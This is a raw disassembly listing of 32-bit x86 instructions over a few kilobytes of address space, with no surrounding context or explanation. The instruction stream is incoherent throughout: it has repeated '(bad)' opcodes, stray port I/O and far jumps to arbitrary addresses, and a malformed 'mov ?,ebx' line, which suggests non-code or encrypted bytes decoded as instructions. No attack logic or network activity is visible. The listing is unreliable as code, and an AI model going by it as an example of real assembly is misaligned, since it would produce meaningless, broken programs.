  40c479:	nop
  40c47a:	mov    esp,0x51a2b788
  40c47f:	data16 fst DWORD PTR [ecx-0x59]
  40c483:	(bad)  
  40c484:	retf   0x1e59
  40c487:	mov    es,WORD PTR [ebx]
  40c489:	add    edi,DWORD PTR [edi-0x3631653d]
  40c48f:	mov    WORD PTR [esi+0x4ec0b015],ss
  40c495:	cmc    
  40c496:	jbe    0x40c482
  40c498:	pop    ebp
  40c499:	mov    eax,ds:0x1848e5d
  40c49e:	lahf   
  40c49f:	jns    0x40c498
  40c4a1:	imul   eax,eax,0xffffff90
  40c4a4:	imul   eax,DWORD PTR [ebp-0x769eed83],0x31
  40c4ab:	lahf   
  40c4ac:	jmp    0x40c4a5
  40c4ae:	mov    edi,0x39246668
  40c4b3:	fimul  WORD PTR [ecx+0x49]
  40c4b6:	mov    ah,0xe3
  40c4b8:	into   
  40c4b9:	in     al,0xd1
  40c4bb:	jl     0x40c4f2
  40c4bd:	inc    ebx
  40c4be:	test   eax,0xcce68409
  40c4c3:	loopne 0x40c4a1
  40c4c5:	pusha  
  40c4c6:	in     eax,dx
  40c4c7:	iret   
  40c4c8:	xchg   ecx,eax
  40c4c9:	inc    edi
  40c4ca:	fcmovnb st,st(7)
  40c4cc:	xchg   esi,eax
  40c4cd:	sbb    al,0xf0
  40c4cf:	mul    DWORD PTR [ecx-0x32]
  40c4d2:	inc    edi
  40c4d3:	fsub   DWORD PTR [ecx]
  40c4d5:	bound  ebx,QWORD PTR [edx]
  40c4d7:	in     eax,dx
  40c4d8:	retf   
  40c4d9:	push   edi
  40c4da:	(bad)  
  40c4db:	int    0x1e
  40c4dd:	call   0xdb80:0x37e15385
  40c4e4:	loop   0x40c4f8
  40c4e6:	in     al,0xe8
  40c4e8:	ret    
  40c4e9:	mov    ds:0x5d6aa7ed,al
  40c4ee:	push   edi
  40c4ef:	fcomi  st,st(7)
  40c4f1:	imul   edi,DWORD PTR [edi],0xffffffda
  40c4f4:	jo     0x40c53c
  40c4f6:	xchg   esi,eax
  40c4f7:	call   0x80df:0x262db548
  40c4fe:	push   ds
  40c4ff:	sbb    BYTE PTR [ebx-0x6c],0x3a
  40c503:	scas   al,BYTE PTR es:[edi]
  40c504:	push   cs
  40c505:	dec    edi
  40c506:	fsub   st,st(1)
  40c508:	leave  
  40c509:	bound  eax,QWORD PTR [ecx-0x6a]
  40c50c:	rcl    DWORD PTR [edx+eiz*4],1
  40c50f:	test   al,0xb8
  40c511:	sbb    ebp,DWORD PTR [eax-0x6c75e3bc]
  40c517:	retf   
  40c518:	push   0xffffffd9
  40c51a:	add    BYTE PTR [edx+0x56],bl
  40c51d:	hlt    
  40c51e:	sub    eax,0x9d00c052
  40c523:	test   BYTE PTR [ebx],cl
  40c525:	scas   al,BYTE PTR es:[edi]
  40c526:	mov    eax,0xaecf56fa
  40c52b:	xor    eax,0x94ab405e
  40c530:	jecxz  0x40c588
  40c532:	loop   0x40c555
  40c534:	cmp    dl,dl
  40c536:	and    DWORD PTR [edx],eax
  40c538:	lods   eax,DWORD PTR ds:[esi]
  40c539:	dec    edx
  40c53a:	jecxz  0x40c54a
  40c53c:	cmp    ebp,ecx
  40c53e:	add    BYTE PTR [esi],dh
  40c540:	mov    ebx,0x1c4b38c2
  40c545:	lock dec eax
  40c547:	in     eax,0xfd
  40c549:	stc    
  40c54a:	jnp    0x40c5cb
  40c54c:	cmp    edx,DWORD PTR [ebx-0x6a]
  40c54f:	jb     0x40c555
  40c551:	mov    esp,0x1425e3b9
  40c556:	add    ah,dh
  40c558:	(bad)  
  40c55a:	ins    BYTE PTR es:[edi],dx
  40c55b:	hlt    
  40c55c:	test   BYTE PTR [esi+0x78],al
  40c55f:	inc    ecx
  40c560:	dec    esp
  40c561:	pop    ebp
  40c562:	gs jl  0x40c5ca
  40c565:	add    al,0xe5
  40c567:	pop    edx
  40c568:	mov    eax,0x17e2124c
  40c56d:	sbb    DWORD PTR [ebx-0xa2f993f],0x170b18cd
  40c577:	jmp    0x2cdfe735
  40c57c:	mov    ch,0xd6
  40c57e:	loop   0x40c581
  40c580:	and    eax,0x36d26c7e
  40c585:	mov    esi,0xe5fdc992
  40c58a:	fisub  WORD PTR [eax+0x6c]
  40c58d:	jmp    0x996a:0xcebcbf8a
  40c594:	push   0x6d
  40c596:	vhsubps ymm6,ymm1,YMMWORD PTR [eax-0x3f]
  40c59b:	adc    al,0xe4
  40c59d:	dec    edx
  40c59e:	das    
  40c59f:	sbb    eax,DWORD PTR [ecx-0x7d5189c9]
  40c5a5:	out    dx,eax
  40c5a6:	int3   
  40c5a7:	lock les eax,FWORD PTR [esp+ebx*8+0x48b238a9]
  40c5af:	scas   eax,DWORD PTR es:[edi]
  40c5b0:	push   cs
  40c5b1:	and    bh,BYTE PTR [edx]
  40c5b3:	add    eax,0xc1e10939
  40c5b8:	push   ecx
  40c5b9:	xchg   ebx,eax
  40c5ba:	lds    esi,FWORD PTR [edi+0x40]
  40c5bd:	icebp  
  40c5be:	stos   BYTE PTR es:[edi],al
  40c5bf:	push   ebx
  40c5c0:	cmp    eax,DWORD PTR [edx-0x69]
  40c5c3:	mov    bl,0x16
  40c5c5:	bound  esp,QWORD PTR [ebp+0x4d]
  40c5c8:	in     eax,dx
  40c5c9:	mov    esp,0x2a9d9ad6
  40c5ce:	jecxz  0x40c5cd
  40c5d0:	inc    esp
  40c5d1:	fld    DWORD PTR [esi]
  40c5d3:	imul   ebp,DWORD PTR fs:[esi+0x18f37203],0x4763b494
  40c5de:	add    ebp,DWORD PTR [ebp+0x2b]
  40c5e1:	xor    BYTE PTR [ebx],bl
  40c5e3:	sbb    BYTE PTR [ebx-0x44],dh
  40c5e6:	(bad)  [esi-0x7efbccf3]
  40c5ec:	fidiv  WORD PTR [ebx-0x6d]
  40c5ef:	jno    0x40c615
  40c5f1:	jo     0x40c620
  40c5f3:	and    ah,BYTE PTR [edi-0x70792b9b]
  40c5f9:	inc    eax
  40c5fa:	das    
  40c5fb:	jnp    0x40c58a
  40c5fd:	aaa    
  40c5fe:	xor    BYTE PTR [esi],bl
  40c600:	stc    
  40c601:	xchg   ecx,eax
  40c602:	push   esp
  40c603:	push   edx
  40c604:	mov    ebx,0x36404fbf
  40c609:	icebp  
  40c60a:	out    dx,al
  40c60b:	mov    ?,ebx
  40c60d:	mov    ds:0x96f324b0,al
  40c612:	jle    0x40c5a4
  40c614:	and    BYTE PTR [ebx-0x62],al
  40c617:	jmp    0x96cdb3d3
  40c61c:	inc    esp
  40c61d:	cwde   
  40c61e:	mov    ecx,esp
  40c620:	fwait
  40c621:	push   0x17
  40c623:	enter  0x4814,0xeb
  40c627:	sub    ecx,DWORD PTR [ebp-0x53]
  40c62a:	mov    esp,0xc8d19c15
  40c62f:	es jle 0x40c5bf
  40c632:	and    DWORD PTR [edx],ecx
  40c634:	lea    eax,[edx+0x6e]
  40c637:	adc    edi,DWORD PTR [esi-0x6f]
  40c63a:	inc    esi
  40c63b:	(bad)  
  40c63c:	fisub  WORD PTR [eax-0x4c]
  40c63f:	push   ss
  40c640:	ret    
  40c641:	push   ebp
  40c642:	es mov dh,0xe7
  40c645:	js     0x40c693
  40c647:	rcl    ah,cl
  40c649:	cli    
  40c64a:	sub    esp,eax
  40c64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c64d:	sbb    BYTE PTR [edi],bl
  40c64f:	or     DWORD PTR [esi],esi
  40c651:	inc    ebx
  40c652:	inc    edx
  40c653:	cmc    
  40c654:	xchg   ebp,eax
  40c655:	pop    ss
  40c656:	and    BYTE PTR [esi],bh
  40c658:	arpl   WORD PTR ds:0x30ade4d0,bp
  40c65e:	rcr    DWORD PTR [esi],1
  40c660:	sbb    al,0xc8
  40c662:	and    BYTE PTR [ecx],ch
  40c664:	out    0xc4,eax
  40c666:	inc    ecx
  40c667:	fist   WORD PTR [edx-0x7686d369]
  40c66d:	mov    ebx,0x695b0054
  40c672:	clc    
  40c673:	fdivr  QWORD PTR [edi+0x26f8b74]
  40c679:	pop    edx
  40c67a:	mov    cl,BYTE PTR [ebp-0x13101518]
  40c680:	jmp    0x9605:0x6758665e
  40c687:	rcr    DWORD PTR [edx],1
  40c689:	xchg   ebp,eax
  40c68a:	in     eax,dx
  40c68b:	jb     0x40c68a
  40c68d:	pop    ebp
  40c68e:	cwde   
  40c68f:	mov    eax,ds:0xb75639c7
  40c694:	or     DWORD PTR [eax-0x6c43e018],esp
  40c69a:	out    dx,al
  40c69b:	(bad)  
  40c69c:	(bad)  
  40c69d:	out    0xdb,eax
  40c69f:	arpl   WORD PTR [ebp+0x1d],bx
  40c6a2:	dec    edx
  40c6a3:	ins    BYTE PTR es:[edi],dx
  40c6a4:	imul   esp,DWORD PTR [eax+eiz*4-0x4e5cdde6],0xffffffef
  40c6ac:	adc    eax,0xd8c60a61
  40c6b1:	retf   0xdc09
  40c6b4:	pop    ecx
  40c6b5:	sbb    eax,0x751755de
  40c6ba:	push   esi
  40c6bb:	adc    al,0x62
  40c6bd:	push   es
  40c6be:	rol    DWORD PTR [edi+edi*8-0x74],cl
  40c6c2:	pop    eax
  40c6c3:	add    ebp,edi
  40c6c5:	push   cs
  40c6c6:	fdiv   DWORD PTR [ebx+edx*4-0x35a56392]
  40c6cd:	jb     0x40c6ed
  40c6cf:	mov    ch,0x7d
  40c6d1:	js     0x40c728
  40c6d3:	dec    esp
  40c6d4:	sbb    ah,dh
  40c6d6:	inc    edi
  40c6d7:	pusha  
  40c6d8:	data16 adc bl,BYTE PTR [eax]
  40c6db:	sbb    DWORD PTR [eax],0x75945d43
  40c6e1:	call   0xfa2763f4
  40c6e6:	je     0x40c70b
  40c6e8:	xchg   ebx,esp
  40c6ea:	in     eax,dx
  40c6eb:	test   al,0xce
  40c6ee:	retf   0xec0d
  40c6f1:	mov    ebx,DWORD PTR [eax]
  40c6f3:	add    di,WORD PTR [esi+0x46]
  40c6f7:	and    DWORD PTR ss:[edi],esi
  40c6fa:	mov    al,0xe9
  40c6fc:	out    dx,eax
  40c6fd:	push   es
  40c6fe:	sub    ebx,DWORD PTR [edi+0x56aea350]
  40c704:	push   ebp
  40c705:	dec    esi
  40c706:	adc    al,bl
  40c708:	loopne 0x40c6cf
  40c70a:	mov    bl,0x0
  40c70c:	les    ebx,FWORD PTR [esi-0x36ab8aa]
  40c712:	inc    edx
  40c713:	arpl   sp,bp
  40c715:	sub    al,0x1e
  40c717:	mov    ebx,0xc0d80bbf
  40c71c:	push   ebp
  40c71d:	iret   
  40c71e:	loop   0x40c6a3
  40c720:	xchg   BYTE PTR [esi-0x1136de52],al
  40c726:	xor    DWORD PTR [eax],esi
  40c728:	xor    DWORD PTR [ebx-0x56],ebp
  40c72b:	sbb    bl,ah
  40c72d:	test   al,0xe4
  40c72f:	das    
  40c730:	dec    esp
  40c731:	dec    ecx
  40c732:	adc    DWORD PTR ds:0x721e2154,esp
  40c738:	pop    ss
  40c739:	cld    
  40c73a:	test   BYTE PTR [esi+0x24],cl
  40c73d:	and    eax,0x94ca9f65
  40c742:	cmp    eax,0xb26815cc
  40c747:	(bad)  
  40c748:	fcomip st,st(6)
  40c74a:	push   esp
  40c74b:	stos   BYTE PTR es:[edi],al
  40c74c:	add    BYTE PTR [edi-0x3a],0xf7
  40c750:	jmp    0x3937:0x8cda5775
  40c757:	xchg   esi,eax
  40c758:	imul   esi,ecx,0x531ecb9c
  40c75e:	add    eax,0xa226c57d
  40c763:	lea    esi,[ebx+0x7b]
  40c766:	arpl   WORD PTR [ebx+0x4dfe5212],si
  40c76c:	push   edi
  40c76d:	sub    al,0x96
  40c76f:	push   ecx
  40c770:	xor    BYTE PTR [ecx],ch
  40c772:	mov    ebx,0x2cfc7f8b
  40c777:	stos   BYTE PTR es:[edi],al
  40c778:	push   0x7d
  40c77a:	js     0x40c777
  40c77c:	test   BYTE PTR ds:0xe18e97c7,ch
  40c782:	rcr    BYTE PTR [edi],0xf6
  40c785:	pop    esp
  40c786:	je     0x40c806
  40c788:	hlt    
  40c789:	lods   eax,DWORD PTR ds:[esi]
  40c78a:	jmp    0x4331:0x1b70f2f5
  40c791:	sbb    BYTE PTR [edi+ebp*4-0x59],0x3c
  40c796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c797:	add    BYTE PTR [edx+eiz*4],bl
  40c79a:	outs   dx,DWORD PTR ds:[esi]
  40c79b:	cmp    DWORD PTR [edi-0x52663dec],eax
  40c7a1:	or     al,0x69
  40c7a3:	xchg   DWORD PTR [ebx-0x37],ebx
  40c7a6:	sbb    DWORD PTR [ebx-0x6100ef7],0xd
  40c7ad:	cmc    
  40c7ae:	ja     0x40c73c
  40c7b0:	ss or  eax,0x4617d9
  40c7b6:	jp     0x40c78f
  40c7b8:	popf   
  40c7b9:	push   cs
  40c7ba:	call   0x98ac453b
  40c7bf:	fdiv   DWORD PTR [edi+edx*1-0x50]
  40c7c3:	aas    
  40c7c4:	cs ret 0x4a79
  40c7c8:	rcr    DWORD PTR [ecx],0xc4
  40c7cb:	nop
  40c7cc:	pop    ss
  40c7cd:	cmp    ebx,ebx
  40c7cf:	lock fistp WORD PTR [esi-0x5e]
  40c7d3:	pop    ebx
  40c7d4:	adc    ch,BYTE PTR [ecx+0x3f4b91fc]
  40c7da:	mov    ebp,0xd59094b0
  40c7df:	mov    eax,ds:0x583ba74d
  40c7e4:	or     esp,ebp
  40c7e6:	adc    ebx,esp
  40c7e8:	arpl   WORD PTR [ecx],dx
  40c7ea:	dec    eax
  40c7eb:	mov    cl,0xc2
  40c7ed:	je     0x40c81a
  40c7ef:	mov    BYTE PTR ds:0x1f7f0948,ah
  40c7f5:	jo     0x40c80b
  40c7f7:	pop    edi
  40c7f8:	aaa    
  40c7f9:	into   
  40c7fa:	or     al,0x1a
  40c7fc:	xor    esp,DWORD PTR [edx*1+0x3357692d]
  40c803:	dec    ecx
  40c804:	jge    0x40c804
  40c806:	nop
  40c807:	mov    ebx,0x99a5fc10
  40c80c:	(bad)  
  40c80d:	stc    
  40c80e:	dec    BYTE PTR [edi-0x60]
  40c811:	xchg   ebp,eax
  40c812:	cmp    eax,DWORD PTR [esi+0x7d]
  40c815:	mov    eax,ds:0xe18679b5
  40c81a:	rol    BYTE PTR [esi-0x24ba760a],0x53
  40c821:	into   
  40c822:	cld    
  40c823:	cmp    DWORD PTR [edi+0x124aeb2b],0x47
  40c82a:	cld    
  40c82b:	xor    eax,0x85c1b960
  40c830:	fldz   
  40c832:	mov    dl,0x5
  40c834:	mov    eax,ds:0x3c1a83a
  40c839:	cdq    
  40c83a:	push   ebx
  40c83b:	stos   DWORD PTR es:[edi],eax
  40c83c:	ja     0x40c859
  40c83e:	pop    edi
  40c83f:	adc    al,0xaf
  40c841:	pop    ebx
  40c842:	loope  0x40c885
  40c844:	mov    cl,0xb1
  40c846:	in     al,dx
  40c847:	jne    0x40c856
  40c849:	jo     0x40c879
  40c84b:	push   ebx
  40c84c:	xchg   ebp,eax
  40c84d:	rcl    BYTE PTR [ebx],0xbd
  40c850:	repz add bl,bl
  40c853:	ret    
  40c854:	xor    BYTE PTR ss:[ecx-0x7b3f716c],bh
  40c85b:	xor    al,0xe0
  40c85d:	jle    0x40c7e1
  40c85f:	in     al,dx
  40c860:	in     al,0xef
  40c862:	fs (bad) 
  40c864:	adc    DWORD PTR [edx-0x58a4f97e],esp
  40c86a:	rol    BYTE PTR [edi+0x55],1
  40c86d:	add    al,0xa4
  40c86f:	mov    ebx,0x1de6f3b7
  40c874:	leave  
  40c875:	xchg   edx,eax
  40c876:	adc    BYTE PTR [ebx],cl
  40c878:	xchg   esi,eax
  40c879:	or     al,0x43
  40c87b:	call   0xb617:0xec5c6ce5
  40c882:	mov    dl,0x1a
  40c884:	cmp    edx,ebp
  40c886:	mov    bh,0x53
  40c888:	pop    edi
  40c889:	fmul   QWORD PTR [edi-0x61]
  40c88c:	jne    0x40c899
  40c88e:	add    ch,0x21
  40c891:	push   edx
  40c892:	push   esp
  40c893:	idiv   DWORD PTR [edx-0x22c6c04e]
  40c899:	push   ds
  40c89a:	stos   BYTE PTR es:[edi],al
  40c89b:	dec    DWORD PTR [edi+0x2e]
  40c89e:	add    cl,ch
  40c8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8a1:	jae    0x40c8c7
  40c8a3:	pop    eax
  40c8a4:	fnstcw WORD PTR [ebx+0x3c0fa827]
  40c8aa:	(bad)  
  40c8ab:	popa   
  40c8ac:	addr16 ds (bad) 
  40c8b0:	sbb    BYTE PTR [esi-0x55],dl
  40c8b3:	fisubr DWORD PTR [ecx]
  40c8b5:	cmp    eax,0x99427dbc
  40c8ba:	and    DWORD PTR [eax-0x397ff01],0x2a980b08
  40c8c4:	inc    ecx
  40c8c5:	inc    esi
  40c8c6:	ret    0xded3
  40c8c9:	jp     0x40c876
  40c8cb:	imul   edx,DWORD PTR [ebx+ecx*8+0x67ee7a02],0x98a62b28
  40c8d6:	mov    edi,0xc1fc857f
  40c8db:	cmp    eax,eax
  40c8dd:	not    dl
  40c8df:	cmp    edx,DWORD PTR [ebx+0x39]
  40c8e2:	fcomp  QWORD PTR [esi+0x5db5ffe3]
  40c8e8:	pop    ecx
  40c8e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8ea:	add    eax,0x27f0a64
  40c8ef:	ror    dl,1
  40c8f1:	mov    ebx,0xcb06c67c
  40c8f6:	test   eax,0xe7d236d
  40c8fb:	push   edi
  40c8fc:	push   ebp
  40c8fd:	adc    esi,DWORD PTR [edi]
  40c8ff:	xchg   esi,eax
  40c900:	pop    edx
  40c901:	xchg   DWORD PTR [ebx-0x79],ecx
  40c904:	rcr    BYTE PTR [edi+0x70],0xf5
  40c908:	pop    esi
  40c909:	popa   
  40c90a:	neg    DWORD PTR [edi+ecx*2]
  40c90d:	(bad)  
  40c90e:	mov    ch,0xbb
  40c910:	push   ecx
  40c911:	add    esi,DWORD PTR [eax]
  40c913:	add    al,0xfe
  40c915:	cmp    al,0x80
  40c917:	ds in  eax,dx
  40c919:	loopne 0x40c999
  40c91b:	fwait
  40c91c:	mov    ch,0xa1
  40c91e:	int3   
  40c91f:	mov    ss,WORD PTR [ecx]
  40c921:	xchg   esi,eax
  40c922:	test   eax,0x9f9a2917
  40c927:	mov    edx,0x9ed72ce2
  40c92c:	sar    bh,cl
  40c92e:	stos   BYTE PTR es:[edi],al
  40c92f:	xchg   ebx,eax
  40c930:	pop    edx
  40c931:	add    ebp,DWORD PTR [ebp+0x5e]
  40c934:	pop    edi
  40c935:	cdq    
  40c936:	nop
  40c937:	out    0x25,al
  40c939:	ficom  DWORD PTR [edi]
  40c93b:	mov    edx,0xeaa691a0
  40c940:	out    0xa3,eax
  40c942:	push   ss
  40c943:	xlat   BYTE PTR ds:[ebx]
  40c944:	lea    edx,[edi+eax*8-0x1c]
  40c948:	pop    edx
  40c949:	ror    DWORD PTR [edi+0x35],0x30
  40c94d:	rcl    al,0x10
  40c950:	aas    
  40c951:	ror    DWORD PTR [esi-0x7421bbb6],cl
  40c957:	mov    ah,0x3c
  40c959:	add    BYTE PTR [esi-0x67],ch
  40c95c:	adc    eax,0x86f6cc3b
  40c961:	jecxz  0x40c969
  40c963:	jp     0x40c9d4
  40c965:	push   0x40c32505
  40c96a:	ret    0xfa50
  40c96d:	or     al,0x3a
  40c96f:	xor    dl,BYTE PTR [eax-0x1a]
  40c972:	(bad)  
  40c973:	sti    
  40c974:	push   eax
  40c975:	hlt    
  40c976:	arpl   WORD PTR [edx],bp
  40c978:	push   ecx
  40c979:	pop    ebp
  40c97a:	sbb    eax,0x49ec5fb9
  40c97f:	or     DWORD PTR [edi],0x4a
  40c982:	test   ecx,0xf6625ba9
  40c988:	les    esp,FWORD PTR [ecx]
  40c98a:	push   eax
  40c98b:	call   0xa906cbb0
  40c990:	push   es
  40c991:	stos   DWORD PTR es:[edi],eax
  40c992:	push   ss
  40c993:	cmp    edx,edi
  40c995:	pushf  
  40c996:	rol    ch,1
  40c998:	xor    al,0xde
  40c99a:	jl     0x40c956
  40c99c:	leave  
  40c99d:	mov    es,WORD PTR [edi+0x62]
  40c9a0:	out    dx,al
  40c9a1:	pop    edx
  40c9a2:	dec    cx
  40c9a4:	adc    DWORD PTR [edx-0x37b1eeca],0xdc84fc2
  40c9ae:	jp     0x40c9b8
  40c9b0:	ss aas 
  40c9b2:	xchg   BYTE PTR [ebx+0x45],dh
  40c9b5:	fdivr  QWORD PTR [ecx]
  40c9b7:	imul   ecx,DWORD PTR [eax+0x45],0xe9132ef7
  40c9be:	lods   al,BYTE PTR ds:[esi]
  40c9bf:	das    
  40c9c0:	mov    ecx,0x4aa49ddd
  40c9c5:	in     al,dx
  40c9c6:	add    DWORD PTR [ecx+0x503566b],eax
  40c9cc:	xchg   ebx,eax
  40c9cd:	shr    BYTE PTR [eax-0x78],cl
  40c9d0:	pop    edi
  40c9d1:	sub    BYTE PTR [edi+0x30],cl
  40c9d4:	test   ebx,esi
  40c9d6:	ds dec eax
  40c9d8:	mov    edx,0x4e128489
  40c9dd:	ins    BYTE PTR es:[edi],dx
  40c9de:	cmp    BYTE PTR [esi-0x43],ch
  40c9e1:	jo     0x40c9e6
  40c9e3:	pop    ebx
  40c9e4:	je     0x40ca3e
  40c9e6:	cdq    
  40c9e7:	sub    ah,BYTE PTR [ecx+eiz*1+0x53]
  40c9eb:	sti    
  40c9ec:	mov    ecx,0x6f0b74ed
  40c9f1:	jb     0x40ca3e
  40c9f3:	cld    
  40c9f4:	and    BYTE PTR [eax-0x2ad26cc4],bl
  40c9fa:	sar    BYTE PTR [esi-0x32],cl
  40c9fd:	jmp    0x6614ff62
  40ca02:	fsubrp st(0),st
  40ca04:	(bad)
  40ca07:	cmp    al,0xdf
  40ca09:	push   ss
  40ca0a:	jl     0x40ca42
  40ca0c:	mov    edx,0x267b05a5
  40ca11:	int3   
  40ca12:	into   
  40ca13:	outs   dx,BYTE PTR ds:[esi]
  40ca14:	ja     0x40ca4d
  40ca16:	dec    eax
  40ca17:	or     al,bh
  40ca19:	cmp    eax,0x7c6ac10e
  40ca1e:	std    
  40ca1f:	or     esp,DWORD PTR [esi-0xa]
  40ca22:	fdivr  DWORD PTR [edx]
  40ca24:	in     al,0x45
  40ca26:	mov    ch,0x7c
  40ca28:	sub    dh,al
  40ca2a:	dec    esp
  40ca2b:	dec    eax
  40ca2c:	sbb    esi,ecx
  40ca2e:	cmc    
  40ca2f:	mov    edi,0x182b9776
  40ca34:	pop    es
  40ca35:	push   esi
  40ca36:	loop   0x40ca5d
  40ca38:	adc    BYTE PTR [ecx],dh
  40ca3a:	js     0x40c9ed
  40ca3c:	imul   edx,DWORD PTR [ecx-0x1b],0x71d8665d
  40ca43:	adc    DWORD PTR [edi-0x6e],edi
  40ca46:	outs   dx,DWORD PTR ds:[esi]
  40ca47:	push   edi
  40ca48:	out    0xa1,al
  40ca4a:	es xchg ebx,eax
  40ca4c:	pop    ss
  40ca4d:	sar    BYTE PTR [edx+0x59],cl
  40ca50:	sub    DWORD PTR [eax+0x18],0xc738b3ae
  40ca57:	sbb    ecx,esp
  40ca59:	xchg   ah,al
  40ca5b:	scas   eax,DWORD PTR es:[edi]
  40ca5c:	mov    cl,0x6f
  40ca5e:	push   0xd2ec725
  40ca63:	jg     0x40ca07
  40ca65:	fs jae 0x40ca65
  40ca68:	adc    al,dl
  40ca6a:	xchg   esp,eax
  40ca6b:	out    dx,eax
  40ca6c:	cmp    DWORD PTR [edi-0x182a04a8],ebx
  40ca72:	fsubr  QWORD PTR [esi]
  40ca74:	out    0x92,eax
  40ca76:	xor    eax,0x2f54d453
  40ca7b:	push   ecx
  40ca7c:	imul   edi,DWORD PTR [edx+eax*2],0x7ba0f9bd
  40ca83:	dec    esi
  40ca84:	cmp    edx,DWORD PTR [ecx-0x257f86d8]
  40ca8a:	inc    dx
  40ca8c:	jbe    0x40ca1e
  40ca8e:	cmp    edi,eax
  40ca90:	and    esi,DWORD PTR [edx]
  40ca92:	xor    esp,esp
  40ca94:	jg     0x40ca63
  40ca96:	mov    dl,dl
  40ca98:	fldenv [esi+0x3179d6bb]
  40ca9e:	pmulhw mm4,QWORD PTR [edi+0x7f3c0c37]
  40caa5:	add    DWORD PTR [edx+0x34],edi
  40caa8:	mov    ah,BYTE PTR [edi+0x39]
  40caab:	(bad)  
  40caac:	sbb    BYTE PTR [edx],dh
  40caae:	push   esp
  40caaf:	pop    edi
  40cab0:	jo     0x40cb11
  40cab2:	rol    BYTE PTR [edi],cl
  40cab4:	cmp    BYTE PTR [esi-0x27a403bd],0xad
  40cabb:	shl    bl,cl
  40cabd:	xchg   edx,edi
  40cabf:	mov    al,ds:0x7f5f9417
  40cac4:	mov    ah,0x81
  40cac6:	jecxz  0x40ca8f
  40cac8:	aaa    
  40cac9:	push   ds
  40caca:	stc    
  40cacb:	xchg   edi,edx
  40cacd:	or     al,0x36
  40cacf:	out    dx,al
  40cad0:	(bad)  
  40cad1:	mov    bh,0x0
  40cad3:	lods   eax,DWORD PTR ds:[esi]
  40cad4:	mov    ds:0xacf58852,al
  40cad9:	xchg   DWORD PTR [ebp+0x34],edx
  40cadc:	cwde   
  40cadd:	dec    eax
  40cade:	mov    al,ds:0xbc63848e
  40cae3:	test   al,0xd
  40cae5:	pop    ebp
  40cae6:	cmp    BYTE PTR [esi+0x7f],cl
  40cae9:	push   esp
  40caea:	pop    esi
  40caeb:	push   edx
  40caec:	icebp  
  40caed:	retf   
  40caee:	fwait
  40caef:	rol    DWORD PTR [esp+edx*8-0x5f73c0c6],cl
  40caf6:	pop    esi
  40caf7:	pop    eax
  40caf8:	(bad)  
  40caf9:	scas   eax,DWORD PTR es:[edi]
  40cafa:	push   esp
  40cafb:	aad    0x98
  40cafd:	inc    esp
  40cafe:	outs   dx,BYTE PTR ds:[esi]
  40caff:	push   cs
  40cb00:	fldz   
  40cb02:	imul   edx,DWORD PTR [edx-0x17a856b7],0xffffffb2
  40cb09:	pop    edx
  40cb0a:	aaa    
  40cb0b:	inc    eax
  40cb0c:	jmp    0xa02d:0x81582fc1
  40cb13:	jae    0x40caf5
  40cb15:	pop    ss
  40cb16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb17:	or     bh,BYTE PTR ds:0x7cb2784e
  40cb1d:	pushf  
  40cb1e:	sub    DWORD PTR [ebp-0x632b0817],ebx
  40cb24:	jmp    DWORD PTR [ebp+0x6dca18e1]
  40cb2a:	mov    bl,0xc2
  40cb2c:	in     eax,dx
  40cb2d:	cld    
  40cb2e:	pop    ds
  40cb2f:	pop    ecx
  40cb30:	ficom  WORD PTR [esi+ecx*4+0x424e3c16]
  40cb37:	leave  
  40cb38:	push   edi
  40cb39:	(bad)  [esi-0x6d]
  40cb3c:	jae    0x40cb29
  40cb3e:	in     al,dx
  40cb3f:	mov    ch,0xa3
  40cb41:	out    0xf,al
  40cb43:	dec    edi
  40cb44:	test   al,0x12
  40cb46:	fs cmp eax,0x42ec01ae
  40cb4c:	aas    
  40cb4d:	xor    edi,DWORD PTR [ebx]
  40cb4f:	out    dx,eax
  40cb50:	mov    cl,ch
  40cb52:	bound  ebp,QWORD PTR ds:0xba446fe9
  40cb58:	sar    ah,cl
  40cb5a:	aaa    
  40cb5b:	out    0x87,al
  40cb5d:	or     dl,BYTE PTR [esi-0x794dd488]
  40cb63:	sbb    al,0x9c
  40cb65:	mov    ds:0xc18da80f,al
  40cb6a:	pop    esi
  40cb6b:	std    
  40cb6c:	sti    
  40cb6d:	inc    edi
  40cb6e:	sub    al,BYTE PTR [edi]
  40cb70:	sub    al,0x1b
  40cb72:	pop    es
  40cb73:	cbw    
  40cb75:	std    
  40cb76:	ror    DWORD PTR [eax-0x6ee4c9c9],cl
  40cb7c:	jge    0x40cb82
  40cb7e:	shr    al,cl
  40cb80:	pop    esp
  40cb81:	call   0xa488:0x1176aa3c
  40cb88:	adc    al,0x49
  40cb8a:	in     al,dx
  40cb8b:	adc    DWORD PTR [esi+0x71a93b46],0x1a
  40cb92:	or     edi,ebx
  40cb94:	adc    BYTE PTR [edx-0x30],cl
  40cb97:	fisttp WORD PTR [eax+0x7a]
  40cb9a:	in     eax,0xde
  40cb9c:	pop    edi
  40cb9d:	retf   0x7453
  40cba0:	rcl    DWORD PTR [edi],0xa4
  40cba3:	pop    edx
  40cba4:	jle    0x40cb3a
  40cba6:	lods   eax,DWORD PTR ds:[esi]
  40cba7:	iret   
  40cba8:	std    
  40cba9:	mov    DWORD PTR [edx+0x3e0371d2],ecx
  40cbaf:	ins    DWORD PTR es:[edi],dx
  40cbb0:	in     eax,0xc7
  40cbb2:	push   cs
  40cbb3:	imul   eax,DWORD PTR [ebp-0x7ae42c5c],0xe932399a
  40cbbd:	rcl    cl,cl
  40cbbf:	and    al,dl
  40cbc1:	push   esi
  40cbc2:	rcl    bh,cl
  40cbc4:	stos   BYTE PTR es:[edi],al
  40cbc5:	mov    al,ds:0x2cf44844
  40cbca:	cwde   
  40cbcb:	gs repnz in eax,dx
  40cbce:	cmp    bl,ch
  40cbd0:	add    dh,BYTE PTR [edx-0x2]
  40cbd3:	jecxz  0x40cbb3
  40cbd5:	std    
  40cbd6:	outs   dx,BYTE PTR ds:[esi]
  40cbd7:	cs sahf 
  40cbd9:	mov    edx,0x41a7177d
  40cbde:	enter  0x8d6f,0xfb
  40cbe2:	sbb    eax,DWORD PTR [ecx]
  40cbe4:	sbb    edx,DWORD PTR [edx]
  40cbe6:	cdq    
  40cbe7:	push   esi
  40cbe8:	mov    ah,0xd7
  40cbea:	loop   0x40cc07
  40cbec:	pushf  
  40cbed:	js     0x40cc0a
  40cbef:	out    0x9a,al
